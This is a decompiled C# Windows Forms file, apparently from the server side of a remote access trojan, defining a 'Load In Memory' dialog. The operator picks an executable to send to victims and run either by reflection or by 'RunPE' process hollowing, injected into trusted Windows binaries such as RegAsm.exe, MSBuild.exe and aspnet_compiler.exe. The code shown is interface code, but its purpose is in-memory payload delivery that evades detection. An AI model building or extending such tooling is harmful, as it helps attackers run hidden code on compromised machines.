using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Windows.Forms;
using Server.Helper;

namespace Server;

public class FormSendFileToMemory : Form
{
	public bool IsOK;

	private IContainer components;

	private GroupBox groupBox1;

	private Button button1;

	private Label label2;

	private Label label1;

	public ComboBox comboBox1;

	private Button button2;

	private StatusStrip statusStrip1;

	public ToolStripStatusLabel toolStripStatusLabel1;

	private Label label3;

	public ComboBox comboBox2;

	private Button button3;

	public FormSendFileToMemory()
	{
		InitializeComponent();
	}

	private void SendFileToMemory_Load(object sender, EventArgs e)
	{
		comboBox1.SelectedIndex = 0;
		comboBox2.SelectedIndex = 0;
	}

	private void comboBox1_SelectedIndexChanged(object sender, EventArgs e)
	{
		switch (comboBox1.SelectedIndex)
		{
		case 0:
			label3.Visible = false;
			comboBox2.Visible = false;
			break;
		case 1:
			label3.Visible = true;
			comboBox2.Visible = true;
			break;
		}
	}

	private void button1_Click(object sender, EventArgs e)
	{
		using OpenFileDialog openFileDialog = new OpenFileDialog();
		openFileDialog.Filter = "(*.exe)|*.exe";
		if (openFileDialog.ShowDialog() == DialogResult.OK)
		{
			toolStripStatusLabel1.Text = Path.GetFileName(openFileDialog.FileName);
			toolStripStatusLabel1.Tag = openFileDialog.FileName;
			toolStripStatusLabel1.ForeColor = Color.Green;
			IsOK = true;
			if (comboBox1.SelectedIndex == 0)
			{
				try
				{
					new ReferenceLoader().AppDomainSetup(openFileDialog.FileName);
					IsOK = true;
					return;
				}
				catch
				{
					toolStripStatusLabel1.ForeColor = Color.Red;
					toolStripStatusLabel1.Text += " Invalid!";
					IsOK = false;
					return;
				}
			}
		}
		else
		{
			toolStripStatusLabel1.Text = "";
			toolStripStatusLabel1.ForeColor = Color.Black;
			IsOK = true;
		}
	}

	private void button2_Click(object sender, EventArgs e)
	{
		if (IsOK)
		{
			Hide();
		}
	}

	private void Button3_Click(object sender, EventArgs e)
	{
		IsOK = false;
		Hide();
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		base.Dispose(disposing);
	}

	private void InitializeComponent()
	{
		System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Server.FormSendFileToMemory));
		this.groupBox1 = new System.Windows.Forms.GroupBox();
		this.button1 = new System.Windows.Forms.Button();
		this.label2 = new System.Windows.Forms.Label();
		this.label3 = new System.Windows.Forms.Label();
		this.label1 = new System.Windows.Forms.Label();
		this.comboBox2 = new System.Windows.Forms.ComboBox();
		this.comboBox1 = new System.Windows.Forms.ComboBox();
		this.button2 = new System.Windows.Forms.Button();
		this.statusStrip1 = new System.Windows.Forms.StatusStrip();
		this.toolStripStatusLabel1 = new System.Windows.Forms.ToolStripStatusLabel();
		this.button3 = new System.Windows.Forms.Button();
		this.groupBox1.SuspendLayout();
		this.statusStrip1.SuspendLayout();
		base.SuspendLayout();
		this.groupBox1.Controls.Add(this.button1);
		this.groupBox1.Controls.Add(this.label2);
		this.groupBox1.Controls.Add(this.label3);
		this.groupBox1.Controls.Add(this.label1);
		this.groupBox1.Controls.Add(this.comboBox2);
		this.groupBox1.Controls.Add(this.comboBox1);
		this.groupBox1.Location = new System.Drawing.Point(12, 12);
		this.groupBox1.Name = "groupBox1";
		this.groupBox1.Size = new System.Drawing.Size(319, 183);
		this.groupBox1.TabIndex = 0;
		this.groupBox1.TabStop = false;
		this.groupBox1.Text = "Load in memory";
		this.button1.Location = new System.Drawing.Point(112, 87);
		this.button1.Name = "button1";
		this.button1.Size = new System.Drawing.Size(201, 30);
		this.button1.TabIndex = 1;
		this.button1.Text = "Browser";
		this.button1.UseVisualStyleBackColor = true;
		this.button1.Click += new System.EventHandler(button1_Click);
		this.label2.AutoSize = true;
		this.label2.Location = new System.Drawing.Point(6, 90);
		this.label2.Name = "label2";
		this.label2.Size = new System.Drawing.Size(38, 20);
		this.label2.TabIndex = 1;
		this.label2.Text = "File:";
		this.label3.AutoSize = true;
		this.label3.Location = new System.Drawing.Point(6, 142);
		this.label3.Name = "label3";
		this.label3.Size = new System.Drawing.Size(73, 20);
		this.label3.TabIndex = 1;
		this.label3.Text = "Injection:";
		this.label3.Visible = false;
		this.label1.AutoSize = true;
		this.label1.Location = new System.Drawing.Point(6, 37);
		this.label1.Name = "label1";
		this.label1.Size = new System.Drawing.Size(47, 20);
		this.label1.TabIndex = 1;
		this.label1.Text = "Type:";
		this.comboBox2.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
		this.comboBox2.FormattingEnabled = true;
		this.comboBox2.Items.AddRange(new object[5] { "aspnet_compiler.exe", "RegAsm.exe", "MSBuild.exe", "RegSvcs.exe", "vbc.exe" });
		this.comboBox2.Location = new System.Drawing.Point(112, 139);
		this.comboBox2.Name = "comboBox2";
		this.comboBox2.Size = new System.Drawing.Size(201, 28);
		this.comboBox2.TabIndex = 1;
		this.comboBox2.Visible = false;
		this.comboBox1.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
		this.comboBox1.FormattingEnabled = true;
		this.comboBox1.Items.AddRange(new object[2] { "Reflection", "RunPE" });
		this.comboBox1.Location = new System.Drawing.Point(112, 34);
		this.comboBox1.Name = "comboBox1";
		this.comboBox1.Size = new System.Drawing.Size(201, 28);
		this.comboBox1.TabIndex = 1;
		this.comboBox1.SelectedIndexChanged += new System.EventHandler(comboBox1_SelectedIndexChanged);
		this.button2.Location = new System.Drawing.Point(22, 220);
		this.button2.Name = "button2";
		this.button2.Size = new System.Drawing.Size(88, 30);
		this.button2.TabIndex = 1;
		this.button2.Text = "OK";
		this.button2.UseVisualStyleBackColor = true;
		this.button2.Click += new System.EventHandler(button2_Click);
		this.statusStrip1.ImageScalingSize = new System.Drawing.Size(24, 24);
		this.statusStrip1.Items.AddRange(new System.Windows.Forms.ToolStripItem[1] { this.toolStripStatusLabel1 });
		this.statusStrip1.Location = new System.Drawing.Point(0, 274);
		this.statusStrip1.Name = "statusStrip1";
		this.statusStrip1.Size = new System.Drawing.Size(351, 32);
		this.statusStrip1.TabIndex = 2;
		this.statusStrip1.Text = "statusStrip1";
		this.toolStripStatusLabel1.DisplayStyle = System.Windows.Forms.ToolStripItemDisplayStyle.Text;
		this.toolStripStatusLabel1.Name = "toolStripStatusLabel1";
		this.toolStripStatusLabel1.Size = new System.Drawing.Size(24, 25);
		this.toolStripStatusLabel1.Text = "...";
		this.button3.Location = new System.Drawing.Point(243, 220);
		this.button3.Name = "button3";
		this.button3.Size = new System.Drawing.Size(88, 30);
		this.button3.TabIndex = 3;
		this.button3.Text = "CANCEL";
		this.button3.UseVisualStyleBackColor = true;
		this.button3.Click += new System.EventHandler(Button3_Click);
		base.AutoScaleDimensions = new System.Drawing.SizeF(9f, 20f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		base.ClientSize = new System.Drawing.Size(351, 306);
		base.ControlBox = false;
		base.Controls.Add(this.button3);
		base.Controls.Add(this.statusStrip1);
		base.Controls.Add(this.button2);
		base.Controls.Add(this.groupBox1);
		base.Icon = (System.Drawing.Icon)resources.GetObject("$this.Icon");
		base.MaximizeBox = false;
		base.MinimizeBox = false;
		base.Name = "FormSendFileToMemory";
		base.StartPosition = System.Windows.Forms.FormStartPosition.CenterParent;
		this.Text = "Load In Memory";
		base.Load += new System.EventHandler(SendFileToMemory_Load);
		this.groupBox1.ResumeLayout(false);
		this.groupBox1.PerformLayout();
		this.statusStrip1.ResumeLayout(false);
		this.statusStrip1.PerformLayout();
		base.ResumeLayout(false);
		base.PerformLayout();
	}
}
